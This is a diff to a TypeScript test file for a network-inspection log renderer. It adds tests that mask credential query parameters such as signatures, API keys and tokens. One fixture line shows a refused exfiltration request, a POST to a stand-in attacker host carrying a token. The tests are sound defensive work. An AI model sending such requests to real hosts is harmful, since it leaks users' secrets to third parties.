@@ -56,8 +56,8 @@ describe("renderInspectDetails", () => {
     expect(lines[2].startsWith("🚫")).toBe(true);
   });
 
-  it("shows the full URL and method of a refused request", () => {
-    expect(md.includes("POST https://evil.example.com/exfil?token=SECRET")).toBe(true);
+  it("shows the URL and method of a refused request", () => {
+    expect(md.includes("POST https://evil.example.com/exfil?token=***")).toBe(true);
   });
 
   it("names the reason after the arrow instead of a status", () => {
@@ -193,6 +193,45 @@ describe("renderInspectDetails", () => {
       t,
     );
     expect(only.includes("DNS a.com -> resolved")).toBe(true);
+  });
+});
+
+describe("renderInspectDetails credential parameters", () => {
+  const subjectOf = (url: string) => {
+    const md = renderInspectDetails(
+      [{ time: t, action: "allow", protocol: "https", host: "h", port: 443, method: "GET", url }],
+      t,
+    );
+    const line = (md.split("```")[1] ?? "").trim();
+    return line.slice(line.indexOf("GET "), line.indexOf(" ->"));
+  };
+
+  it("replaces a presigned URL's signature and leaves the rest readable", () => {
+    // Which object was fetched and when the link expires are the whole point
+    // of the line; the signature is the only part that grants anything.
+    expect(subjectOf("https://h/x.tar.gz?X-Amz-Signature=abc123&X-Amz-Expires=3600")).toBe(
+      "GET https://h/x.tar.gz?X-Amz-Signature=***&X-Amz-Expires=3600",
+    );
+  });
+
+  it("matches the parameter name whatever its case", () => {
+    expect(subjectOf("https://h/v1?Api_Key=sk_live_1")).toBe("GET https://h/v1?Api_Key=***");
+  });
+
+  it("leaves a parameter nobody credentialled alone", () => {
+    // A refused request has to keep saying what it tried to send, and an
+    // exfiltration payload is named whatever its author chose.
+    expect(subjectOf("https://h/?d=BASE64PAYLOAD&page=2")).toBe(
+      "GET https://h/?d=BASE64PAYLOAD&page=2",
+    );
+  });
+
+  it("leaves an empty value empty rather than claiming a secret", () => {
+    expect(subjectOf("https://h/v1?token=&page=2")).toBe("GET https://h/v1?token=&page=2");
+  });
+
+  it("leaves a URL with no query of its own alone", () => {
+    expect(subjectOf("https://h/token/key")).toBe("GET https://h/token/key");
   });
 });
 
